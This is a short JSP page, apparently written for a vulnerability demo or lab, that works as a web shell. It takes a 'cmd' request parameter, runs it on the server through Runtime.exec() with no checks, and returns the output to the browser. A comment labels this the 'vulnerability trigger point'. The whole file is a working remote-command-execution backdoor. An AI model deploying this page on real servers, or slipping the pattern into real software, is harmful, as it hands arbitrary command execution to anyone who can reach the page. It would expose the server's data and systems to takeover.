<%--
  Created by IntelliJ IDEA.
  User: snowstorm-maxy
  Date: 2025/9/30
  Time: 12:50
  To change this template use File | Settings | File Templates.
--%>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  // 漏洞触发点
  String cmd = request.getParameter("cmd");

  BufferedReader in = new BufferedReader(
          new InputStreamReader(
                  Runtime.getRuntime().exec(cmd).getInputStream(),
                  "UTF-8"
          )
  );

  String line;
  StringBuilder results = new StringBuilder();
  while ((line = in.readLine()) != null) {
    results.append(line);
  }
  in.close();

  out.print(results);
%>
